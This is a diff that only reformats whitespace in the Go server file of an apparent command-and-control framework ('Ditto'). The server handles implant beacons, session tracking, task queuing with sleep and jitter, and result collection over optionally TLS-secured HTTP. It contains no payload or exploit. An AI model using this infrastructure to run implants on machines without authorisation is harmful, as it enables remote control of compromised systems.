@@ -21,8 +21,8 @@ import (
 
 // Server handles C2 server operations
 type Server struct {
-	config     *core.Config
-	logger     interface {
+	config *core.Config
+	logger interface {
 		Info(string, ...interface{})
 		Debug(string, ...interface{})
 		Error(string, ...interface{})
@@ -65,7 +65,7 @@ func NewServerWithTaskQueue(config *core.Config, logger interface {
 		handler:   http.NewServeMux(),
 		taskQueue: taskQueue,
 	}
-	
+
 	s.setupRoutes()
 	return s
 }
@@ -73,13 +73,13 @@ func NewServerWithTaskQueue(config *core.Config, logger interface {
 func (s *Server) setupRoutes() {
 	// Beacon endpoint
 	s.handler.HandleFunc("/beacon", s.handleBeacon)
-	
+
 	// Task endpoint
 	s.handler.HandleFunc("/task", s.handleTask)
-	
+
 	// Result endpoint
 	s.handler.HandleFunc("/result", s.handleResult)
-	
+
 	// Health check
 	s.handler.HandleFunc("/health", s.handleHealth)
 }
@@ -99,7 +99,7 @@ func (s *Server) Start(listenAddr string) error {
 		},
 		NextProtos: []string{"h2", "http/1.1"}, // Enable HTTP/2
 	}
-	
+
 	s.server = &http.Server{
 		Addr:         listenAddr,
 		Handler:      s.handler,
@@ -108,15 +108,15 @@ func (s *Server) Start(listenAddr string) error {
 		WriteTimeout: s.config.Server.WriteTimeout,
 		IdleTimeout:  s.config.Server.KeepAlive,
 	}
-	
+
 	s.logger.Info("Starting C2 server on %s", listenAddr)
-	s.logger.Debug("Server configuration: TLS=%v, ReadTimeout=%v, WriteTimeout=%v", 
+	s.logger.Debug("Server configuration: TLS=%v, ReadTimeout=%v, WriteTimeout=%v",
 		s.config.Server.TLSEnabled, s.config.Server.ReadTimeout, s.config.Server.WriteTimeout)
-	
+
 	if s.config.Server.TLSEnabled {
 		certPath := s.config.Server.TLSCertPath
 		keyPath := s.config.Server.TLSKeyPath
-		
+
 		// If certificate paths are empty, use defaults
 		if certPath == "" || keyPath == "" {
 			certPath = "./certs/server.crt"
@@ -125,32 +125,32 @@ func (s *Server) Start(listenAddr string) error {
 			s.config.Server.TLSCertPath = certPath
 			s.config.Server.TLSKeyPath = keyPath
 		}
-		
+
 		// Check if certificates exist, generate if needed
 		if _, err := os.Stat(certPath); os.IsNotExist(err) {
 			s.logger.Info("TLS certificates not found, generating self-signed certificates...")
 			cm := certificates.NewCAManager(s.logger)
-			
+
 			// Generate CA first
 			if err := cm.GenerateCA("Ditto CA"); err != nil {
 				return fmt.Errorf("failed to generate CA for server certificates: %w\n"+
 					"  Solution: Check file permissions or disable TLS in config", err)
 			}
-			
+
 			// Generate server certificate
 			certPEM, keyPEM, err := cm.GenerateCertificate("localhost", []string{"localhost", "127.0.0.1"}, nil)
 			if err != nil {
 				return fmt.Errorf("failed to generate server certificate: %w\n"+
 					"  Solution: Check file permissions or disable TLS in config", err)
 			}
-			
+
 			// Ensure cert directory exists
 			certDir := filepath.Dir(certPath)
 			if err := os.MkdirAll(certDir, 0755); err != nil {
 				return fmt.Errorf("failed to create certificate directory %s: %w\n"+
 					"  Solution: Check directory permissions or specify a different path", certDir, err)
 			}
-			
+
 			// Write certificates
 			if err := os.WriteFile(certPath, certPEM, 0644); err != nil {
 				return fmt.Errorf("failed to write certificate file %s: %w\n"+
@@ -160,7 +160,7 @@ func (s *Server) Start(listenAddr string) error {
 				return fmt.Errorf("failed to write key file %s: %w\n"+
 					"  Solution: Check file permissions or specify a different path", keyPath, err)
 			}
-			
+
 			s.logger.Info("TLS certificates generated successfully: %s, %s", certPath, keyPath)
 		} else {
 			// Verify key file also exists
@@ -171,7 +171,7 @@ func (s *Server) Start(listenAddr string) error {
 			}
 			s.logger.Debug("Using existing TLS certificates: %s, %s", certPath, keyPath)
 		}
-		
+
 		s.logger.Info("Starting TLS server on %s", listenAddr)
 		if err := s.server.ListenAndServeTLS(certPath, keyPath); err != nil && err != http.ErrServerClosed {
 			s.logger.Error("TLS server failed: %v", err)
@@ -179,7 +179,7 @@ func (s *Server) Start(listenAddr string) error {
 		}
 		return nil
 	}
-	
+
 	s.logger.Info("Starting HTTP server on %s", listenAddr)
 	if err := s.server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
 		s.logger.Error("HTTP server failed: %v", err)
@@ -189,21 +189,21 @@ func (s *Server) Start(listenAddr string) error {
 }
 
 func (s *Server) handleBeacon(w http.ResponseWriter, r *http.Request) {
-	s.logger.Debug("Incoming beacon request from %s (method: %s, headers: %v)", 
+	s.logger.Debug("Incoming beacon request from %s (method: %s, headers: %v)",
 		r.RemoteAddr, r.Method, r.Header)
-	
+
 	sessionID := r.Header.Get("X-Session-ID")
 	newSessionCreated := false
-	
+
 	s.sessionsMu.Lock()
 	var session *Session
-	
+
 	if sessionID != "" {
 		// Session ID provided - find existing session
 		session, _ = s.sessions[sessionID]
 		s.logger.Debug("Session ID provided: %s (found: %v)", sessionID, session != nil)
 	}
-	
+
 	if session == nil {
 		// No session ID or session not found - try to match by RemoteAddr
 		// This handles the case where implant lost its session ID but is reconnecting
@@ -216,7 +216,7 @@ func (s *Server) handleBeacon(w http.ResponseWriter, r *http.Request) {
 			}
 		}
 	}
-	
+
 	if session == nil {
 		// Truly new session - generate new ID
 		sessionID = generateSessionID()
@@ -242,7 +242,7 @@ func (s *Server) handleBeacon(w http.ResponseWriter, r *http.Request) {
 		s.logger.Debug("Existing session updated: %s (last seen: %v)", sessionID, session.LastSeen)
 	}
 	s.sessionsMu.Unlock()
-	
+
 	// Read client metadata
 	var metadata map[string]interface{}
 	if err := json.NewDecoder(r.Body).Decode(&metadata); err == nil {
@@ -251,26 +251,26 @@ func (s *Server) handleBeacon(w http.ResponseWriter, r *http.Request) {
 	} else if err.Error() != "EOF" {
 		s.logger.Debug("Failed to decode metadata for session %s: %v", sessionID, err)
 	}
-	
+
 	// Return any pending tasks
 	tasks := s.getPendingTasks(sessionID)
 	s.logger.Debug("Returning %d pending tasks for session %s", len(tasks), sessionID)
-	
+
 	response := map[string]interface{}{
 		"session_id": sessionID,
 		"tasks":      tasks,
 		"sleep":      s.config.Communication.Sleep.Seconds(),
 		"jitter":     s.config.Communication.Jitter,
 	}
-	
+
 	w.Header().Set("Content-Type", "application/json")
 	if err := json.NewEncoder(w).Encode(response); err != nil {
 		s.logger.Error("Failed to encode beacon response for session %s: %v", sessionID, err)
 		return
 	}
-	
+
 	s.logger.Debug("Beacon response sent successfully for session %s", sessionID)
-	
+
 	// Trigger notification for new sessions (only for truly new ones)
 	if newSessionCreated {
 		// This will be handled by syncSessionsWithContext
@@ -284,12 +284,12 @@ func (s *Server) handleTask(w http.ResponseWriter, r *http.Request) {
 		http.Error(w, "Missing session ID", http.StatusBadRequest)
 		return
 	}
-	
+
 	s.logger.Debug("Task request from session %s (from %s)", sessionID, r.RemoteAddr)
-	
+
 	tasks := s.getPendingTasks(sessionID)
 	s.logger.Debug("Retrieved %d pending tasks for session %s", len(tasks), sessionID)
-	
+
 	// Mark tasks as in-progress and schedule removal
 	for _, taskMap := range tasks {
 		if taskID, ok := taskMap["id"].(string); ok {
@@ -307,7 +307,7 @@ func (s *Server) handleTask(w http.ResponseWriter, r *http.Request) {
 			}
 		}
 	}
-	
+
 	w.Header().Set("Content-Type", "application/json")
 	if err := json.NewEncoder(w).Encode(map[string]interface{}{
 		"tasks": tasks,
@@ -315,7 +315,7 @@ func (s *Server) handleTask(w http.ResponseWriter, r *http.Request) {
 		s.logger.Error("Failed to encode task response for session %s: %v", sessionID, err)
 		return
 	}
-	
+
 	s.logger.Debug("Task response sent successfully for session %s", sessionID)
 }
 
@@ -326,20 +326,20 @@ func (s *Server) handleResult(w http.ResponseWriter, r *http.Request) {
 		http.Error(w, "Missing session ID", http.StatusBadRequest)
 		return
 	}
-	
+
 	s.logger.Debug("Result request from session %s (from %s)", sessionID, r.RemoteAddr)
-	
+
 	var result map[string]interface{}
 	if err := json.NewDecoder(r.Body).Decode(&result); err != nil {
 		s.logger.Error("Failed to decode result JSON from session %s: %v", sessionID, err)
 		http.Error(w, "Invalid JSON", http.StatusBadRequest)
 		return
 	}
-	
+
 	taskType, _ := result["type"].(string)
 	taskID, _ := result["task_id"].(string)
 	s.logger.Debug("Received result for task %s (type: %s) from session %s", taskID, taskType, sessionID)
-	
+
 	// Update task status and remove after completion
 	if taskID != "" {
 		if s.taskQueue != nil {
@@ -353,9 +353,9 @@ func (s *Server) handleResult(w http.ResponseWriter, r *http.Request) {
 			}()
 		}
 	}
-	
+
 	s.logger.Info("Task result from session %s: task_id=%s, type=%s", sessionID, taskID, taskType)
-	
+
 	w.WriteHeader(http.StatusOK)
 	if _, err := w.Write([]byte("OK")); err != nil {
 		s.logger.Error("Failed to write result response: %v", err)
@@ -373,7 +373,7 @@ func (s *Server) handleHealth(w http.ResponseWriter, r *http.Request) {
 func (s *Server) getPendingTasks(sessionID string) []map[string]interface{} {
 	pending := s.taskQueue.GetPending()
 	tasks := make([]map[string]interface{}, 0, len(pending))
-	
+
 	for _, task := range pending {
 		// Filter tasks by session if specified in parameters
 		if task.Parameters != nil {
@@ -383,7 +383,7 @@ func (s *Server) getPendingTasks(sessionID string) []map[string]interface{} {
 				}
 			}
 		}
-		
+
 		tasks = append(tasks, map[string]interface{}{
 			"id":         task.ID,
 			"type":       task.Type,
@@ -391,7 +391,7 @@ func (s *Server) getPendingTasks(sessionID string) []map[string]interface{} {
 			"parameters": task.Parameters,
 		})
 	}
-	
+
 	return tasks
 }
 
@@ -413,7 +413,7 @@ func (s *Server) EnqueueTask(task *tasks.Task) error {
 func (s *Server) GetSessions() map[string]*Session {
 	s.sessionsMu.RLock()
 	defer s.sessionsMu.RUnlock()
-	
+
 	// Create a copy to avoid race conditions
 	sessions := make(map[string]*Session, len(s.sessions))
 	for id, session := range s.sessions {
@@ -431,4 +431,3 @@ func (s *Server) Stop() error {
 	}
 	return nil
 }
-
